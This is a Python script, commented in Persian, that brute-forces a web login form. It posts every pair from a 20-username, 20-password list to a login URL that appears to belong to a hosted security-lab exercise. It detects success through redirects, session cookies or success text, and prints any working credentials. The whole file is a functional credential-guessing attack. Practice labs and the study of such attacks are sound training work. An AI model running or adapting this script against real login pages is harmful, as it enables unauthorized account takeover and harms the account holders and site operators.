import requests
from bs4 import BeautifulSoup

# لیست پسوردها
passwords = [
    "|L1$z6d{<QbY",
    "9vC3qF#bZgRm",
    "tF:06LpL^ndV",
    "q%ZdV!Bt8PKu",
    "xMb4*s<6EWr5",
    "Z!HjQ9>oA7aM",
    "P$J6nxFD=VhL",
    "7cM|%5mUjW9r",
    "2aX^Pf3W#b6u",
    "Zk@7aVm:9Q$D",
    "4vFjW#C7xP2k",
    "H9m^XvV|8nR2",
    "a4TzE6|y&Nw7",
    "3W<z^Fm7@bLp",
    "F3A+gY9zLx%7",
    "X8Pw|0ZfA4*Y",
    "R9c#Lh:5Qp2U",
    "V2zP!w#k6Lr4",
    "t%YvB1oL^6gQ",
    "W7X^Fb>9yJ3q"
]

# لیست نام کاربری‌ها
usernames = [
    "dvegafisheredward",
    "raymond68",
    "bethbarrett",
    "triciafloyd",
    "dschultz",
    "ambercarter",
    "shawnaperez",
    "pwolfe",
    "patrick40",
    "smithjacqueline",
    "philipwhite",
    "eileengibson",
    "elizabeth53",
    "davidburke",
    "galvanalexandra",
    "sharon18",
    "ukemp",
    "smiller",
    "nicolechandler",
    "franciscoanderson"
]

# آدرس ورود به سیستم
login_url = "https://lab-2701415-9a70393ada93702a.apps.ps.avalcloud.com/users/auth/login/"

# استفاده از session برای حفظ کوکی‌ها در درخواست‌های متوالی
session = requests.Session()

found = False  # علامت موفقیت یافتن ترکیب صحیح

for username in usernames:
    for password in passwords:
        data = {"username": username, "password": password}
        response = session.post(login_url, data=data)
        
        # گزینه ۱: بررسی تغییر URL (در صورت هدایت به صفحه‌ای متفاوت، احتمال موفقیت بالا است)
        if response.url != login_url:
            print(f"ورود موفق برای {username} با رمز {password} (URL تغییر کرده به: {response.url})")
            found = True
            break
        
        # گزینه ۲: بررسی وجود کوکی (مثلاً اگر کوکی "sessionid" تنظیم شود)
        if response.cookies.get("sessionid"):
            print(f"ورود موفق برای {username} با رمز {password} (کوکی sessionid تنظیم شده)")
            found = True
            break

        # گزینه ۳: استفاده از BeautifulSoup برای جستجوی المان یا متنی که فقط در صفحه موفقیت وجود دارد
        soup = BeautifulSoup(response.text, "html.parser")
        # به عنوان مثال، اگر در صفحه موفقیت عبارت "موفق" وجود داشته باشد:
        if soup.find(text=lambda t: "موفق" in t):
            print(f"ورود موفق برای {username} با رمز {password} (متن موفقیت یافت شد)")
            found = True
            break

        # نمایش وضعیت برای دیباگ (این خط می‌تواند در زمان نهایی حذف شود)
        print(f"امتحان شد: {username} - {password} | کد وضعیت: {response.status_code}")
    
    if found:
        break

if not found:
    print("هیچ ترکیب موفقیتی یافت نشد.")
